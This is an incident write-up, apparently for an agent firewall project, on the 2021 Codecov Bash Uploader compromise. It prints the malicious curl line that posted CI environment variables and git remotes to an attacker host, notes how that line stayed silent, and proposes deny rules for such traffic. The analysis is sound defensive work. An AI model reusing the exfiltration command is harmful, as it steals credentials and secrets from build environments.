# Codecov bash uploader exfiltrated CI environment variables to an attacker server

- Date: 2021-04 (malicious script served from 2021-01-31 to 2021-04-01; disclosed 2021-04-15) | Agent/tool: Codecov Bash Uploader (curl-installed CI script) | Axis: exfil

## What happened

Codecov disclosed on April 15, 2021 that an attacker had modified its Bash Uploader script. Because thousands of CI pipelines install it with `curl`-style commands and run it directly, every affected CI job executed the tampered script. The added line sent the job's `git remote -v` output and its entire environment to an attacker server. That environment held AWS IAM keys, deploy keys, API tokens, service accounts, and passwords. Rapid7 confirmed its own CI was hit and analyzed the payload. The attacker had first stolen an HMAC key from a public Docker image layer and used it to alter the script in Google Cloud Storage, so the script was served with the malicious line for roughly two months.

## How it went wrong

A CI job runs the uploader the documented way: download the script from codecov.io and execute it with bash. The script contained this line:

`curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://<attacker>/upload/v2 || true`

The double-quoted command substitutions expand before exec, so the `curl` process's argv carries the repository remotes and the full environment in cleartext, POSTed to an unknown host. `-s` silences it and `|| true` swallows failures, so nothing shows in build logs. At the OS level: exec of bash running a downloaded script, then exec of curl with a huge env-shaped argv and one network_connect to a host that has nothing to do with code coverage.

## What the firewall should learn

The killer signal is again argv-visible exfil: `exec(curl)` with `-d`/`--data-binary` whose body looks like dumped environment (`VAR=value` chains, `$(env)` output) or with an `-d @-` body fed from another command's output. Rule ideas: (1) deny curl/wget POST bodies built from `$(env)`, `$(printenv)`, or long multi-line `KEY=value` content; (2) approval_required when a script that arrived over the network (downloaded by the same ancestry) subsequently opens any outbound connection — download-then-egress is the uploader pattern; (3) the existing `network.download.pipe-to-interpreter` rule would gate the initial `curl | bash`, but nothing today gates what the downloaded script sends out afterwards, which is the actual damage.

## Sources

- [Codecov: Post-Mortem / Root Cause Analysis (April 2021)](https://about.codecov.io/apr-2021-post-mortem/)
- [Rapid7: Analysis of the Codecov Supply Chain Compromise](https://www.rapid7.com/blog/post/2021/04/16/codecov-discloses-supply-chain-compromise/)
- [Sonatype: What You Need to Know About the Codecov Incident](https://www.sonatype.com/blog/what-you-need-to-know-about-the-codecov-incident-a-supply-chain-attack-gone-undetected-for-2-months)
